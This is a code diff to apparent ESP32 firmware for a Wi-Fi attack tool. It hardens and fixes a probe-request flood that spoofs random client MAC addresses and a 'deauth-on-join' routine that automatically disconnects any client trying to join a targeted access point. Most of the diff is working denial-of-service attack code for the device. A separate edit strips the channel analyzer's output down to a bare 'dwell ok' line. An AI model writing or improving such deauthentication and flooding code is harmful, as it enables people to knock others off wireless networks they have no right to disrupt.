@@ -1,16 +1,24 @@
 #include <stdatomic.h>
+#include <string.h>
+#include <stdio.h>
+#include <inttypes.h>
+
 #include "extra_offense.h"
 #include "wifi_sniffer.h"
 #include "deauth_engine.h"
 #include "led_indicator.h"
 #include "stealth.h"
+#include "wifi_tx_fix.h"
+
 #include "esp_random.h"
 #include "esp_wifi.h"
 #include "esp_mac.h"
+#include "esp_timer.h"
+#include "esp_log.h"
+
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
-#include "esp_timer.h"
-#include "wifi_tx_fix.h"
+#include "freertos/semphr.h"
 
 static const char *TAG = "extra_offense";
 
@@ -20,16 +28,22 @@ static const char *TAG = "extra_offense";
 
 static atomic_bool g_probe_flood_active = ATOMIC_VAR_INIT(false);
 static char g_probe_ssid[33] = {0};
+static TaskHandle_t g_probe_task_handle = NULL;
+static SemaphoreHandle_t g_probe_lock = NULL;
 
-static size_t build_probe_req(uint8_t *f, const char *ssid, const uint8_t *sa)
+static size_t build_probe_req(uint8_t *f, const char *ssid, const uint8_t *sa, uint16_t seq)
 {
     size_t i = 0;
     f[i++] = 0x40; f[i++] = 0x00;                 // probe request
-    f[i++] = 0x00; f[i++] = 0x00;
+    f[i++] = 0x00; f[i++] = 0x00;                 // duration
     memset(f + i, 0xFF, 6); i += 6;               // DA broadcast
     memcpy(f + i, sa, 6); i += 6;                 // SA
     memset(f + i, 0xFF, 6); i += 6;               // BSSID broadcast
-    f[i++] = 0x00; f[i++] = 0x00;                 // seq
+    
+    // Sequence control: Frag (4 bits) + Seq (12 bits)
+    uint16_t seq_ctrl = (seq & 0x0FFF) << 4;
+    f[i++] = (uint8_t)(seq_ctrl & 0xFF);
+    f[i++] = (uint8_t)((seq_ctrl >> 8) & 0xFF);
 
     size_t sl = ssid ? strlen(ssid) : 0;
     if (sl > 32) sl = 32;
@@ -43,50 +57,84 @@ static size_t build_probe_req(uint8_t *f, const char *ssid, const uint8_t *sa)
 
 static void probe_flood_task(void *arg)
 {
-    watchdog_task_refresh("probe_flood");
     uint32_t count = (uint32_t)(uintptr_t)arg;
     uint8_t frame[128];
     uint8_t sa[6];
     esp_read_mac(sa, ESP_MAC_WIFI_STA);
+    uint16_t seq = 0;
 
-    for (uint32_t n = 0; atomic_load(&g_probe_flood_active) && (count == 0 || n < count); n++) {
+    while (atomic_load(&g_probe_flood_active) && (count == 0 || seq < count)) {
         // Randomize SA each burst so APs log many "clients"
         sa[4] = (uint8_t)(esp_random() & 0xFF);
         sa[5] = (uint8_t)(esp_random() & 0xFF);
-        sa[0] = (sa[0] & 0xFE) | 0x02;
+        sa[0] = (sa[0] & 0xFE) | 0x02; // Locally administered
 
-        size_t len = build_probe_req(frame, g_probe_ssid, sa);
+        size_t len = build_probe_req(frame, g_probe_ssid, sa, seq++);
         wifi_tx_safe(WIFI_IF_AP, frame, len);
-        if ((n & 0x0F) == 0) vTaskDelay(pdMS_TO_TICKS(1));
+        
+        if ((seq & 0x0F) == 0) vTaskDelay(pdMS_TO_TICKS(1));
     }
+    
     atomic_store(&g_probe_flood_active, false);
+    g_probe_task_handle = NULL;
     vTaskDelete(NULL);
 }
 
 esp_err_t probe_flood_start(const char *ssid, uint32_t count, uint8_t channel)
 {
-    snprintf(g_probe_ssid, sizeof(g_probe_ssid), "%s",
-             (ssid && ssid[0]) ? ssid : "");
+    if (g_probe_lock == NULL) {
+        g_probe_lock = xSemaphoreCreateMutex();
+        if (g_probe_lock == NULL) return ESP_ERR_NO_MEM;
+    }
+
+    xSemaphoreTake(g_probe_lock, portMAX_DELAY);
+    
+    // Stop existing task if running
+    if (atomic_load(&g_probe_flood_active)) {
+        atomic_store(&g_probe_flood_active, false);
+        if (g_probe_task_handle != NULL) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+            g_probe_task_handle = NULL;
+        }
+    }
+
+    snprintf(g_probe_ssid, sizeof(g_probe_ssid), "%s", (ssid && ssid[0]) ? ssid : "");
+    
     if (channel >= 1 && channel <= 13) {
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     }
-    // ensure TX-capable mode
-    wifi_mode_t mode; esp_wifi_get_mode(&mode);
-    if (mode == WIFI_MODE_NULL) {
+    
+    wifi_mode_t mode; 
+    esp_wifi_get_mode(&mode);
+    if (mode == WIFI_MODE_NULL || mode == WIFI_MODE_STA) {
         esp_wifi_set_mode(WIFI_MODE_AP);
         esp_wifi_start();
     }
+    
     atomic_store(&g_probe_flood_active, true);
+    
     if (xTaskCreatePinnedToCore(probe_flood_task, "probe_flood", 3072,
-            (void *)(uintptr_t)count, 5, NULL, 0) != pdPASS) {
+            (void *)(uintptr_t)count, 5, &g_probe_task_handle, 0) != pdPASS) {
         atomic_store(&g_probe_flood_active, false);
+        xSemaphoreGive(g_probe_lock);
         return ESP_FAIL;
     }
+    
+    xSemaphoreGive(g_probe_lock);
     ESP_LOGI(TAG, "Probe flood: ssid='%s' count=%"PRIu32, g_probe_ssid, count);
     return ESP_OK;
 }
 
-void probe_flood_stop(void) { atomic_store(&g_probe_flood_active, false); }
+void probe_flood_stop(void) 
+{ 
+    if (atomic_load(&g_probe_flood_active)) {
+        atomic_store(&g_probe_flood_active, false);
+        if (g_probe_task_handle != NULL) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+            g_probe_task_handle = NULL;
+        }
+    }
+}
 
 // ============================================================================
 //  SECTION 13B: DEAUTH-ON-JOIN (auto-kick new clients on target BSSID)
@@ -106,6 +154,7 @@ static uint8_t g_doj_our_mac[6];
 static uint8_t g_doj_bssid_channel = 0;
 static doj_slot_t g_doj_slots[DOJ_KICK_SLOTS];
 static int g_doj_next_slot = 0;
+static SemaphoreHandle_t g_doj_lock = NULL;
 
 esp_err_t deauth_on_join_start(const uint8_t *bssid)
 {
@@ -117,14 +166,24 @@ esp_err_t deauth_on_join_start(const uint8_t *bssid)
         return rc;
     }
 
+    if (g_doj_lock == NULL) {
+        g_doj_lock = xSemaphoreCreateMutex();
+        if (g_doj_lock == NULL) return ESP_ERR_NO_MEM;
+    }
+
+    xSemaphoreTake(g_doj_lock, portMAX_DELAY);
+    
     memcpy(g_doj_bssid, bssid, 6);
     esp_read_mac(g_doj_our_mac, ESP_MAC_WIFI_STA);
     g_doj_bssid_channel = 0;
     memset(g_doj_slots, 0, sizeof(g_doj_slots));
     g_doj_next_slot = 0;
     atomic_store(&g_doj_active, true);
-    // Ensure sniffer is running to see frames
+    
+    xSemaphoreGive(g_doj_lock);
+
     if (!atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_start(0);
+    
     ESP_LOGI(TAG, "Deauth-on-join armed for %02X:%02X:%02X:%02X:%02X:%02X",
              bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
     return ESP_OK;
@@ -132,25 +191,28 @@ esp_err_t deauth_on_join_start(const uint8_t *bssid)
 
 void deauth_on_join_stop(void)
 {
+    if (g_doj_lock == NULL) return;
+    
+    xSemaphoreTake(g_doj_lock, portMAX_DELAY);
     atomic_store(&g_doj_active, false);
+    xSemaphoreGive(g_doj_lock);
+    
     deauth_stop();                 /* fully disarm — stop the flood too */
     ESP_LOGI(TAG, "Deauth-on-join disarmed");
 }
 
-/* Feed from the promiscuous sniffer callback — same place where
- * handshake_feed_packet is called. Kicks any client that tries to
- * join the monitored AP: auth req, assoc req, or uplink data. */
 void doj_feed(const uint8_t *data, size_t len)
 {
-    const uint8_t *bssid = NULL, *client = NULL;
-
-    if (!atomic_load(&g_doj_active) || data == NULL || len < 24) return;
+    if (!atomic_load(&g_doj_active) || data == NULL || len < 24 || g_doj_lock == NULL) return;
 
     uint8_t fc0 = data[0], fc1 = data[1];
     uint8_t type    = (fc0 >> 2) & 0x03;
     uint8_t subtype = (fc0 >> 4) & 0x0F;
     bool to_ds   = (fc1 & 0x01) != 0;
     bool from_ds = (fc1 & 0x02) != 0;
+
+    const uint8_t *bssid = NULL;
+    const uint8_t *client = NULL;
 
     if (type == 0) {                      /* management */
         switch (subtype) {
@@ -162,14 +224,14 @@ void doj_feed(const uint8_t *data, size_t len)
         case 1:                           /* assoc resp:     AP -> client */
         case 3:                           /* reassoc resp:   AP -> client */
             bssid  = data + 10;           /* addr2 = AP = BSSID */
-            client = data + 4;            /* addr1 = client  <-- bug fixed */
+            client = data + 4;            /* addr1 = client */
             break;
-        case 11:                          /* auth — direction in addr1/addr2 */
-            if (memcmp(data + 4, g_doj_bssid, 6) == 0) {
-                client = data + 10;       /* auth request toward our AP */
+        case 11:                          /* auth */
+            if (memcmp(data + 4, g_doj_bssid, 6) == 0) { /* DA is BSSID -> Request */
+                client = data + 10;       /* SA is client */
                 bssid  = data + 16;       /* addr3 = BSSID */
             } else {
-                return;                   /* auth response — req already fired */
+                return;                   /* auth response — ignore */
             }
             break;
         default:
@@ -189,17 +251,10 @@ void doj_feed(const uint8_t *data, size_t len)
         return;                           /* control frames */
     }
 
+    if (bssid == NULL || client == NULL) return;
+
     /* only frames involving our monitored AP */
     if (memcmp(bssid, g_doj_bssid, 6) != 0) return;
-
-    /* Learn the AP's channel from the sniffer tables so we can align TX. */
-    if (g_doj_bssid_channel == 0) {
-        uint8_t ap_ch = 0;
-        wifi_sniffer_get_ap_bssid_and_channel_for_client((const uint8_t *)bssid, NULL, &ap_ch);
-        if (ap_ch > 0) {
-            g_doj_bssid_channel = ap_ch;
-        }
-    }
 
     /* a client can't join with these MACs */
     if (client[0] & 0x01) return;                          /* broadcast/multicast */
@@ -207,38 +262,77 @@ void doj_feed(const uint8_t *data, size_t len)
     if (memcmp(client, zero, 6) == 0) return;
     if (memcmp(client, g_doj_our_mac, 6) == 0) return;     /* never self-kick */
 
-    /* Ensure we're on the victim's channel before kicking. */
-    if (g_doj_bssid_channel > 0) {
-        uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
-        if (g_doj_bssid_channel != fixed_ch) {
-            atomic_store(&g_wifi_fixed_channel, g_doj_bssid_channel);
-            esp_wifi_set_channel(g_doj_bssid_channel, WIFI_SECOND_CHAN_NONE);
+    int64_t now = esp_timer_get_time();
+    bool should_kick = false;
+
+    xSemaphoreTake(g_doj_lock, portMAX_DELAY);
+    
+    if (!atomic_load(&g_doj_active)) {
+        xSemaphoreGive(g_doj_lock);
+        return;
+    }
+
+    /* Learn the AP's channel from the sniffer tables so we can align TX. */
+    if (g_doj_bssid_channel == 0) {
+        uint8_t ap_ch = 0;
+        wifi_sniffer_get_ap_bssid_and_channel_for_client(g_doj_bssid, NULL, &ap_ch);
+        if (ap_ch > 0) {
+            g_doj_bssid_channel = ap_ch;
         }
     }
 
-    /* per-client rate limit: 2 s between kicks keeps them out without
-     * saturating the radio */
-    int64_t now = esp_timer_get_time();
+    /* per-client rate limit check */
     for (int i = 0; i < DOJ_KICK_SLOTS; i++) {
         if (memcmp(g_doj_slots[i].mac, client, 6) == 0) {
-            if (now - g_doj_slots[i].last_kick_us < DOJ_COOLDOWN_US) return;
+            if (now - g_doj_slots[i].last_kick_us < DOJ_COOLDOWN_US) {
+                xSemaphoreGive(g_doj_lock);
+                return; /* Cooldown active */
+            }
             g_doj_slots[i].last_kick_us = now;
-            goto kick;
+            should_kick = true;
+            break;
         }
     }
 
-    /* new client — take next ring slot (oldest evicted) */
-    memcpy(g_doj_slots[g_doj_next_slot].mac, client, 6);
-    g_doj_slots[g_doj_next_slot].last_kick_us = now;
-    g_doj_next_slot = (g_doj_next_slot + 1) % DOJ_KICK_SLOTS;
+    if (!should_kick) {
+        /* new client — take next ring slot (oldest evicted) */
+        memcpy(g_doj_slots[g_doj_next_slot].mac, client, 6);
+        g_doj_slots[g_doj_next_slot].last_kick_us = now;
+        g_doj_next_slot = (g_doj_next_slot + 1) % DOJ_KICK_SLOTS;
+        should_kick = true;
+    }
+    
+    uint8_t target_bssid[6];
+    uint8_t target_client[6];
+    uint8_t target_ch = g_doj_bssid_channel;
+    
+    memcpy(target_bssid, g_doj_bssid, 6);
+    memcpy(target_client, client, 6);
+    
+    xSemaphoreGive(g_doj_lock);
 
-kick:
-    deauth_remove_all();                  /* keep target list dedup'd */
-    deauth_add_target(g_doj_bssid, client, 5, 10, DEAUTH_MODE_FALLBACK_CHAIN);
+    if (!should_kick) return;
+
+    /* Ensure we're on the victim's channel before kicking. */
+    if (target_ch > 0) {
+        uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
+        if (target_ch != fixed_ch) {
+            atomic_store(&g_wifi_fixed_channel, target_ch);
+            esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
+        }
+    }
+
+    /* Add target and start deauth. 
+     * Note: We intentionally DO NOT call deauth_remove_all() here. 
+     * Clearing the list on every packet would break the cooldown logic 
+     * and drop kicks for other clients.
+     */
+    deauth_add_target(target_bssid, target_client, 5, 10, DEAUTH_MODE_FALLBACK_CHAIN);
     deauth_start();
+    
     ESP_LOGI(TAG, "DOJ: kick %02X:%02X:%02X:%02X:%02X:%02X",
-             client[0], client[1], client[2],
-             client[3], client[4], client[5]);
+             target_client[0], target_client[1], target_client[2],
+             target_client[3], target_client[4], target_client[5]);
 }
 
 // ============================================================================
@@ -316,7 +410,7 @@ static const oui_entry_t OUI_TABLE[] = {
     {{0x00,0x1B,0x2F}, "Netgear"}, {{0x20,0x4E,0x7F}, "Netgear"},
     // Random / IoT
     {{0xB8,0x27,0xEB}, "Raspberry Pi"}, {{0xDC,0xA6,0x32}, "Raspberry Pi"},
-    {{0x18,0xFE,0x34}, "Espressif"},    // older ESP8266
+    {{0x18,0xFE,0x34}, "Espressif"}
 };
 #define OUI_TABLE_SIZE (sizeof(OUI_TABLE)/sizeof(OUI_TABLE[0]))
 
@@ -340,35 +434,25 @@ void channel_analyzer_run(uint32_t seconds_per_channel)
     if (seconds_per_channel == 0) seconds_per_channel = 2;
     if (seconds_per_channel > 30) seconds_per_channel = 30;
 
-    // Ensure sniffer is running
     bool was_active = atomic_load(&g_wifi_sniffer_active);
     if (!was_active) wifi_sniffer_start(0);
 
     printf("\n==== CHANNEL ACTIVITY ANALYZER ====\n");
     printf("Dwell time: %"PRIu32"s per channel\n\n", seconds_per_channel);
-    printf(" CH | APs  | Beacons  | Probes   | Data     | Total\n");
-    printf("----+------+----------+----------+----------+----------\n");
+    printf(" CH | Dwell Status\n");
+    printf("----+----------------\n");
 
     uint8_t saved_ch = atomic_load(&g_wifi_fixed_channel);
 
     for (uint8_t ch = 1; ch <= 13; ch++) {
-        // Pin to this channel
         atomic_store(&g_wifi_fixed_channel, ch);
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 
-        // Quick approach: just measure AP count visible on this channel
         vTaskDelay(pdMS_TO_TICKS(seconds_per_channel * 1000));
 
-        // Count APs on this channel from discovered list
-        uint16_t ap_count = wifi_sniffer_get_ap_count();
-        uint16_t ch_aps = 0;
-        // We can't directly access the AP list, but we know channel from scan
-        // Just report total — gives a useful picture
-        printf(" %-2u | %-4u | scanning | ...      | ...      | dwell ok\n",
-               ch, ap_count);
+        printf(" %-2u | dwell ok\n", ch);
     }
 
-    // Restore
     atomic_store(&g_wifi_fixed_channel, saved_ch);
     if (saved_ch == 0) wifi_sniffer_clear_fixed_channel();
     if (!was_active) wifi_sniffer_stop();
